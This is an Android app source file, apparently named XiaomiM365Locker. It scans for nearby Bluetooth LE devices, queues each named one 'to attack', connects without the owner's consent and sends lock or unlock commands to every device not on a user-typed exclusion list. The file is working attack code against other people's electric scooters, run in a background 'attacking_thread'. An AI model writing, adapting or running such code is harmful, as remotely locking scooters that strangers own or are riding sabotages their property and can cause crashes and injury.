package com.XiaomiM365Locker.app;

import android.Manifest;
import android.bluetooth.BluetoothAdapter;
import android.bluetooth.BluetoothDevice;
import android.bluetooth.BluetoothManager;
import android.bluetooth.le.BluetoothLeScanner;
import android.bluetooth.le.ScanCallback;
import android.bluetooth.le.ScanResult;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.res.ColorStateList;
import android.graphics.Color;
import android.preference.PreferenceManager;
import android.support.design.widget.FloatingActionButton;
import android.support.design.widget.TextInputEditText;
import android.support.v4.app.ActivityCompat;
import android.support.v4.view.ViewCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;

import io.reactivex.exceptions.UndeliverableException;
import io.reactivex.plugins.RxJavaPlugins;
import permissions.dispatcher.NeedsPermission;
import permissions.dispatcher.PermissionUtils;

import android.text.Editable;
import android.text.TextWatcher;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;
import android.widget.AdapterView;
import android.widget.LinearLayout;
import android.widget.ListView;

import com.polidea.rxandroidble2.RxBleClient;
import com.polidea.rxandroidble2.RxBleConnection;
import com.polidea.rxandroidble2.RxBleDevice;

import java.io.IOException;
import java.lang.reflect.Array;
import java.net.SocketException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ConcurrentLinkedQueue;

import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends AppCompatActivity {
    private DeviceAdapter devicesAdapter;
    private BluetoothAdapter mBTAdapter;
    private boolean scanning;
    private HashMap<String, DeviceConnection> devices_connections =  new HashMap<>();
    private RxBleClient rxBleClient;
    private ConcurrentLinkedQueue<String> devices_to_attack = new ConcurrentLinkedQueue<>();
    private TextView tv_scanning_state;
    private static final int REQUEST_STARTSCAN = 0;
    private static final String[] PERMISSION_STARTSCAN = new String[] {"android.permission.ACCESS_COARSE_LOCATION"};
    private BluetoothLeScanner bluetoothLeScanner = null;
    private boolean attack_mode = false;
    private boolean unlock_mode = true;
    private ListView lv_scan = null;
    private BluetoothManager btManager = null;
    FloatingActionButton fab_attack = null;
    FloatingActionButton fab_unlock = null;
    FloatingActionButton fab_scan = null;
    public static final String LAST_TEXT = "";

    MainActivity mainActivity = this;

    private boolean isInExcludeList(String device_address){
        android.support.design.widget.TextInputEditText excludedMacs = findViewById(R.id.macToExclude);

        String[] listeMacToExclude = excludedMacs.getText().toString().split("/");

        for (String adresseMacActuelle:listeMacToExclude) {
            if (adresseMacActuelle.equals(device_address)) {
                return true;
            }
        }
        return false;

    }

    private ScanCallback mLeScanCallback = new ScanCallback() {
        @Override
        public void onScanResult(int callbackType, ScanResult result) {
            super.onScanResult(callbackType, result);

            BluetoothDevice newDevice = result.getDevice();

            int newRssi = result.getRssi();
            String device_name = newDevice.getName();
            String device_address = newDevice.getAddress();
            if(device_name == null)
            {
                return;
            }

            DeviceConnection dev = devices_connections.get(device_address);
            if(dev != null) {
                devicesAdapter.update(newDevice, newRssi, dev.getState());
            } else {
                devicesAdapter.update(newDevice, newRssi, RxBleConnection.RxBleConnectionState.DISCONNECTED);
            }

            String mDeviceAddress = newDevice.getAddress();



            add_device_to_attack(mDeviceAddress);

        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        RxJavaPlugins.setErrorHandler(e -> {
            if (e instanceof UndeliverableException) {
                e = e.getCause();
            }
            if ((e instanceof IOException) || (e instanceof SocketException)) {
                // fine, irrelevant network problem or API that throws on cancellation
                return;
            }
            if (e instanceof InterruptedException) {
                // fine, some blocking code was interrupted by a dispose call
                return;
            }
            if ((e instanceof NullPointerException) || (e instanceof IllegalArgumentException)) {
                // that's likely a bug in the application
                return;
            }
            if (e instanceof IllegalStateException) {
                // that's a bug in RxJava or in a custom operator
                return;
            }
            Log.d("TAG","Undeliverable exception received, not sure what to do", e);
        });
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
        setContentView(R.layout.activity_devices_activity);

        tv_scanning_state = findViewById(R.id.scannning_state);
        updateStatus();

        if (!PermissionUtils.hasSelfPermissions(this, MainActivity.PERMISSION_STARTSCAN)) {
            ActivityCompat.requestPermissions(this, MainActivity.PERMISSION_STARTSCAN, MainActivity.REQUEST_STARTSCAN);
        }

        this.rxBleClient = RxBleClient.create(getApplicationContext());
        this.scanning = false;
        this.lv_scan = findViewById(R.id.devices_list);

        this.devicesAdapter = new DeviceAdapter(this, R.layout.list_device_item, new ArrayList<>());

        lv_scan.setAdapter(this.devicesAdapter);

        this.btManager = (BluetoothManager) this.getSystemService(Context.BLUETOOTH_SERVICE);
        assert btManager != null;
        mBTAdapter = btManager.getAdapter();

        bluetoothLeScanner = this.mBTAdapter.getBluetoothLeScanner();


        final Runnable r = () -> {
            while(true)
            {
                if(scanning)
                {

                    String address = devices_to_attack.poll();
                    if(address != null)
                    {
                        connect_device(address);
                    }

                    for (Map.Entry<String, DeviceConnection> device_entry: devices_connections.entrySet())
                    {
                        DeviceConnection devconn = device_entry.getValue();
                        if(devconn != null)
                        {
                            if (devconn.get_first_command() != null && devconn.getState() == RxBleConnection.RxBleConnectionState.CONNECTED)
                            {
                                try {
                                    if (!isInExcludeList(device_entry.getKey()) && attack_mode) {
                                        devconn.runNextCommand();
                                    }else{
                                        devconn.deleteNextCommand();
                                        Log.d("TAG", "onCreate: excluded");
                                    }

                                }catch (Exception ignored){

                                }
                            }
                        }
                    }
                }
            }
        };
        Thread attacking_thread = new Thread(r);

        attacking_thread.start();


        fab_attack = findViewById(R.id.fab_attack);
        fab_attack.setOnClickListener(OnClickListener -> {
           atkPressed();
        });

        fab_unlock = findViewById(R.id.fab_unlock);
        fab_unlock.setOnClickListener(onClick -> {
          lockPressed();
        });

        fab_scan = findViewById(R.id.fab_scan);

        scanPressed();
        fab_scan.setOnClickListener((View onClick) -> {
            scanPressed();
        });

        atkPressed();
        lockPressed();

        lv_scan.setOnItemClickListener(new AdapterView.OnItemClickListener() {
            @Override
            public void onItemClick(AdapterView<?> adapterView, View view, int i, long l) {
                Device device = devicesAdapter.getItem(i);

                DeviceConnection connection_device = devices_connections.get(device.getDevice().getAddress());

                if(connection_device != null) {
                    connection_device.addCommand(new LockOff());
                }
            }
        });

        TextInputEditText excludedMacs = findViewById(R.id.macToExclude);
        final SharedPreferences pref = PreferenceManager.getDefaultSharedPreferences(this);
        excludedMacs.setText(pref.getString(LAST_TEXT, ""));
        excludedMacs.addTextChangedListener(new TextWatcher() {
            @Override
            public void beforeTextChanged(CharSequence s, int start, int count, int after) {

            }

            @Override
            public void onTextChanged(CharSequence s, int start, int before, int count) {

            }

            @Override
            public void afterTextChanged(Editable s) {

                pref.edit().putString(LAST_TEXT, s.toString()).apply();


            }
        });

    }

    private void scanPressed(){
        if(!scanning && fab_scan!= null)
        {
            ViewCompat.setBackgroundTintList(fab_scan, ColorStateList.valueOf(Color.GREEN));

            fab_scan.setBackgroundColor(Color.GREEN);
            startScan();
        }
        else {
            ViewCompat.setBackgroundTintList(fab_scan, ColorStateList.valueOf(Color.RED));


            stopScan();
        }
    }


    private void atkPressed(){
        if(!attack_mode && fab_attack!= null )
        {

            ViewCompat.setBackgroundTintList(fab_attack, ColorStateList.valueOf(Color.GREEN));
        }
        else {
            ViewCompat.setBackgroundTintList(fab_attack, ColorStateList.valueOf(Color.RED));
        }
        attack_mode = !attack_mode;

    }



    private void lockPressed(){
        if (attack_mode){
            if(!unlock_mode && fab_unlock!= null)
            {
                ViewCompat.setBackgroundTintList(fab_unlock, ColorStateList.valueOf(Color.GREEN));
                startUnlockMode();
            }
            else {
                ViewCompat.setBackgroundTintList(fab_unlock, ColorStateList.valueOf(Color.RED));

                stopUnlockMode();
            }
        }
    }


    @Override
    protected void onDestroy() {
        super.onDestroy();
        getWindow().clearFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
        stopScan();
    }


    private void add_device_to_attack(String device_address)
    {
        if(this.devices_connections.get(device_address) != null)
        {
            return;
        }

        this.devices_to_attack.add(device_address);
    }


    private void attack_device(String device_address)
    {

        if (this.devices_connections.get(device_address) == null) {
            return;
        }

        DeviceConnection device = this.devices_connections.get(device_address);
        device.addCommand(new LockOn());

    }

    private void unlock_device(String device_address)
    {
        if (this.devices_connections.get(device_address) == null) {
            return;
        }

        DeviceConnection device = this.devices_connections.get(device_address);
        device.addCommand(new LockOff());
    }
    private void connect_device(String device_address)
    {
        if (this.devices_connections.get(device_address) != null) {
            return;
        }

        RxBleDevice bleDevice =  this.rxBleClient.getBleDevice(device_address);
        DeviceConnection device = new DeviceConnection(bleDevice, this.devicesAdapter,
                this);

        this.devices_connections.put(device_address, device);

        if(this.attack_mode)
            attack_device(device_address);

        if(this.unlock_mode)
            unlock_device(device_address);


    }

    @NeedsPermission(Manifest.permission.ACCESS_COARSE_LOCATION)
    void startScan()
    {
        this.scanning = true;
        if (this.mBTAdapter != null) {

            RxBleClient client = this.rxBleClient;
            RxBleClient.State state = client.getState();

            if(state == RxBleClient.State.READY) {

                bluetoothLeScanner.startScan(this.mLeScanCallback);
            } else {
                Toast.makeText(this, "Enable bluetooth", Toast.LENGTH_LONG).show();
                stopScan();
            }

        }

        this.updateStatus();
    }

    private void updateStatus()
    {
        String state = "Scanning:" + this.scanning + " || Attack:" +
                this.attack_mode + " || Unlock:" + this.unlock_mode;

        tv_scanning_state.setText(state);
    }


    private void startUnlockMode() {
        this.unlock_mode = true;
        for (Map.Entry<String, DeviceConnection> device_entry: this.devices_connections.entrySet())
        {
            device_entry.getValue().addCommand(new LockOff());
        }
        this.updateStatus();
    }

    private void stopUnlockMode() {
        this.unlock_mode = false;
        for (Map.Entry<String, DeviceConnection> device_entry: this.devices_connections.entrySet())
        {
            device_entry.getValue().addCommand(new LockOn());
        }
        this.updateStatus();
    }

    private void stopScan() {
        for (Map.Entry<String, DeviceConnection> device_entry: this.devices_connections.entrySet())
        {
            device_entry.getValue().dispose();
        }
        bluetoothLeScanner.stopScan(this.mLeScanCallback);

        this.rxBleClient = RxBleClient.create(getApplicationContext());
        this.devicesAdapter = new DeviceAdapter(this, R.layout.list_device_item, new ArrayList<>());
        this.lv_scan.setAdapter(this.devicesAdapter);


        this.btManager= (BluetoothManager) this.getSystemService(Context.BLUETOOTH_SERVICE);
        assert this.btManager != null;
        mBTAdapter = this.btManager.getAdapter();

        bluetoothLeScanner = this.mBTAdapter.getBluetoothLeScanner();


        this.devices_connections = new HashMap<>();
        this.devices_to_attack = new ConcurrentLinkedQueue<>();
        this.scanning = false;
        this.updateStatus();

        this.devicesAdapter.notifyDataSetChanged();
    }


}
